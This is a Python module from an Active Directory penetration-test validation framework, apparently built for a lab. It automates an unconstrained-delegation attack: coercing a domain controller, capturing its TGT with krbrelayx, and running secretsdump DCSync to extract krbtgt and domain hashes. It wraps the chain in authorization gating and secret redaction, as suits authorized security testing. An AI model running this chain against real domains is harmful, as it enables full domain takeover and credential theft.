"""UNCONSTRAINED-DELEG validation executor -- FULL (T1c-2), listener-based.

Encodes the UNCONSTRAINED-DELEG recipe (claude-mem #66146 C5, recipe-known-not-run)
as a krbrelayx TGT-capture listener + coercion-trigger chain on the ADR-001
:class:`ProcessManager` chassis, followed by a synchronous DCSync:

    start krbrelayx on a controlled unconstrained host (<unconstrained_host>)
    fire a coercion trigger at <victim_dc> -> the DC authenticates to us
    poll for the captured <DC>$.ccache ARTIFACT (file_present_nonempty)
    impacket-secretsdump -k -no-pass  (DCSync with the captured DC TGT)
    stop listener

Terminal fact: ``replication_dump`` -- DCSync returned replication data
(krbtgt/domain credentials). **Non-mutating** (DCSync is a replication *read*; no
AD object is written), so there is no rollback. A timeout with no captured TGT,
or a DCSync that returns nothing, is an honest ``inconclusive``/not-proved, never
a proof.

``verified_recipe = False`` (recipe-known-not-run, #66146 C5): ships honest
(skipped by ``AutoConfirm`` unless ``include_unverified``), all invocations +
markers UNVERIFIED (flagged below).

Secrets rule: the captured TGT lives only as the ``<DC>$.ccache`` ARTIFACT (its
PRESENCE is the predicate; its path is never stored in the receipt) and the
DCSync output (krbtgt/replication secrets) is presence-detected only -- NO secret
is read into the receipt. The proof token is over public identifiers only.

Scoring identity (ad-lab-harness ``truth/GOAD-proof.json``): UNCONSTRAINED-DELEG
keys on ``{host_id}`` (dc01/dc02/dc03). ``target_identity`` resolves the
(overridable) ``victim_dc`` host through ``config.host_aliases``.

UNVERIFIED ASSUMPTIONS (pin in-lab, mirroring adcs_esc1.py):
* the krbrelayx listener invocation and the ``<DC>$.ccache`` artifact filename/path;
* the coercion-trigger invocation; the secretsdump ``-k -no-pass`` DCSync success
  marker (krbtgt / "Dumping Domain Credentials" / a ``:::`` hash line). If the real
  paths/markers differ the chain gets no positive artifact/marker and honestly
  reports not-proved/inconclusive.
"""
from __future__ import annotations

import re
from pathlib import Path
from typing import Any, Optional

from ..recommend import ParamSpec, ParamValue, values
from ..predicates import file_present_nonempty
from .. import proof
from ._reveal_common import key_material, dump_hashes
from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv)
from .process_manager import poll_for_capture
from .coercion import COERCION_METHODS, coercion_trigger_argv, machine_account, _short_name


# ---- UNVERIFIED DCSync success marker (see module docstring) ------------------
# A DCSync returned replication data: a krbtgt entry, the dump banner, or a
# secretsdump hash line (``user:rid:lm:nt:::``). Presence only -- the matched
# content lives only in the private reveal artifact, never the receipt.
_RE_DCSYNC_OK = re.compile(
    r"(krbtgt:\d|Dumping Domain Credentials|Kerberos keys grabbed|"
    r"[^\s:]+:\d+:[0-9a-f]{32}:[0-9a-f]{32}:::)", re.I)


def _captured_ccache(out_dir: Path, sam: str) -> Optional[str]:
    """Return the captured ``<DC>$.ccache`` path if present+non-empty, else None.

    Prefers the exact ``<sam>.ccache`` krbrelayx names the file; falls back to any
    non-empty ``*.ccache`` in the run dir. The path is used in-process for the
    DCSync (KRB5CCNAME) only -- it is SECRET and never stored in the receipt.
    """
    exact = out_dir / f"{sam}.ccache"
    if file_present_nonempty(str(exact)):
        return str(exact)
    try:
        for p in out_dir.glob("*.ccache"):
            if file_present_nonempty(str(p)):
                return str(p)
    except OSError:
        pass
    return None


class UnconstrainedDelegExecutor(ValidationExecutor):
    recovers_credentials = True
    technique = "UNCONSTRAINED-DELEG"
    technique_class = "delegation"
    terminal_kind = "replication_dump"
    mutating = False
    verified_recipe = False   # recipe-known-not-run (#66146 C5)
    recipe_ref = ("#66146 C5 UNCONSTRAINED-DELEG = start krbrelayx on controlled "
                  "unconstrained host ; coerce <victim_dc> -> capture <DC>$.ccache ; "
                  "secretsdump -k -no-pass DCSync (recipe-known, NOT lab-proven)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        victim = finding.host or ""
        return [
            ParamSpec(
                name="victim_dc", kind="target_host",
                description="The DC to coerce; its machine-account TGT is captured "
                            "and used for DCSync. Use its hostname.",
                recommended=victim,
                rationale="The host of the aranum unconstrained-delegation finding "
                          "(#66142).",
            ),
            ParamSpec(
                name="unconstrained_host", kind="target_host",
                description="The controlled host that has unconstrained delegation, "
                            "where krbrelayx runs. Operator-supplied; empty = run on "
                            "the local (framework) listener.",
                recommended="",
                rationale="The operator's controlled unconstrained host (research "
                          "3.1); no safe default, so the operator supplies it.",
                required=False,
            ),
            ParamSpec(
                name="listener_host", kind="target_host",
                description="Host the krbrelayx listener binds / the coercion points "
                            "back at. Empty = framework-managed on the local interface.",
                recommended="",
                rationale="Framework-managed by default (ADR-001 Decision 2); "
                          "override for an operator-positioned listener.",
                required=False,
            ),
            ParamSpec(
                name="method", kind="free",
                description="Coercion vector (auto/petitpotam/printerbug/dfscoerce).",
                recommended="auto",
                rationale="Coercer multiplexer by default (research 3.3).",
                choices=list(COERCION_METHODS),
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        # UNCONSTRAINED-DELEG facet keys on {host_id}: resolve the (overridable)
        # victim DC host through host_aliases so the target carries host_id.
        victim = (params["victim_dc"].value if "victim_dc" in params else None) \
            or finding.host or ""
        return ctx.config.resolve_target_identity(victim)

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        listener = v.get("unconstrained_host") or v.get("listener_host") or "<local>"
        sam = machine_account(v["victim_dc"])
        return [
            f"start krbrelayx TGT-capture listener on {listener}",
            f"coerce ({v['method']}) {v['victim_dc']} -> {listener}",
            f"poll for the captured {sam or '<DC>$'}.ccache artifact",
            "secretsdump -k -no-pass  (DCSync; replication_dump, non-mutating, no rollback)",
        ]

    # ---------------------------------------------------------------- execute
    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
        return list(artifact.get("_reveal", []))

    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        # Private recovery channel, populated before downstream proof/cleanup.
        artifact = {"_reveal": []}
        ctx._pending_reveal_artifact = artifact

        def finish_artifact(*args):
            artifact.update(self._artifact(*args))
            return artifact

        cfg = ctx.config
        v = values(params)
        victim_dc = v["victim_dc"]
        unconstrained_host = v.get("unconstrained_host") or ""
        listener_host = v.get("listener_host") or ""
        method = v.get("method") or "auto"
        sam = machine_account(victim_dc)
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)
        where = unconstrained_host or listener_host or "<local>"

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode if res else None, note=note))

        # Gate the active coercion op (non-mutating, but it drives traffic).
        verdict = ctx.authorizer.authorize(
            "coerce", {"victim_dc": victim_dc, "unconstrained_host": where})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "coerce"
            errors.append("gate_denied:coerce")
            return finish_artifact(steps, gate, mutation, None, False, errors)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "coerce"

        # 1) start the krbrelayx TGT-capture listener (non-blocking). UNVERIFIED.
        listener_argv = ["krbrelayx.py", "--target", victim_dc]
        try:
            handle = ctx.proc_manager.start(listener_argv, cwd=str(out_dir))
        except OSError as exc:
            record("start_listener", listener_argv, None, False, note=f"spawn failed: {exc}")
            errors.append("listener_start_failed")
            return finish_artifact(steps, gate, mutation, None, False, errors)
        record("start_listener", listener_argv, None, True,
               note=f"krbrelayx on {where}")

        def capture_tgt():
            path = _captured_ccache(out_dir, sam)
            for reveal in key_material(self.technique, "ccache", sam, path):
                if reveal not in artifact["_reveal"]:
                    artifact["_reveal"].append(reveal)
            return path is not None

        # 2) fire the coercion trigger (synchronous) to make the DC authenticate.
        try:
            trig_argv = coercion_trigger_argv(method, victim_dc,
                                              listener_host or unconstrained_host or ctx.config.dc_ip, cfg)
            res = ctx.runner.run(trig_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
            fired = not (res.timed_out or res.error)
            record("coerce_trigger", trig_argv, res, fired,
                   note=f"method={method}" + ("" if fired else " (trigger did not run)"))

            # 3) poll for the captured <DC>$.ccache ARTIFACT.
            _out, captured = poll_for_capture(
                ctx.proc_manager, handle,
                success=lambda _o: capture_tgt(),
                interval_s=cfg.poll_interval_s, timeout_s=cfg.tool_timeout_s)
        finally:
            capture_tgt()
            ctx.proc_manager.stop(handle)

        ccache = _captured_ccache(out_dir, sam)
        capture_tgt()
        captured = captured or (ccache is not None)
        # Step note never carries the ccache path (it is secret-marked).
        record("tgt_capture", listener_argv, RunResult(returncode=None), captured,
               note=f"captured {sam} TGT" if captured else "no TGT captured")
        if not captured or ccache is None:
            errors.append("unconstrained_no_tgt")
            return finish_artifact(steps, gate, mutation, None, False, errors)

        # 4) DCSync with the captured DC TGT (secretsdump -k -no-pass). ------
        # Presence-only: we test whether replication data came back, never store it.
        dcsync_argv = ["impacket-secretsdump", "-k", "-no-pass", "-dc-ip", cfg.dc_ip,
                       f"{cfg.domain}/{sam}@{victim_dc}"]
        res = ctx.runner.run(dcsync_argv, timeout=cfg.tool_timeout_s,
                             env={"KRB5CCNAME": ccache}, cwd=str(out_dir))
        artifact["_reveal"].extend(dump_hashes(
            self.technique, (res.stdout or "") + "\n" + (res.stderr or "")))
        dcsync_ok = bool(_RE_DCSYNC_OK.search((res.stdout or "") + (res.stderr or "")))
        record("dcsync", dcsync_argv, res, dcsync_ok,
               note="replication data returned" if dcsync_ok else "no replication data")
        if not dcsync_ok:
            errors.append("dcsync_failed")
            return finish_artifact(steps, gate, mutation, None, False, errors)

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=True,
            predicate=(f"captured {sam}'s TGT via unconstrained delegation and used it "
                       "for DCSync (krbtgt/replication data returned)"),
            proof_token=proof.proof_token("UNCONSTRAINED-DELEG", cfg.domain, victim_dc,
                                          sam, "dcsync_krbtgt"),
            extra={"victim": sam, "method": method})
        return finish_artifact(steps, gate, mutation, terminal_fact, True, errors)

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
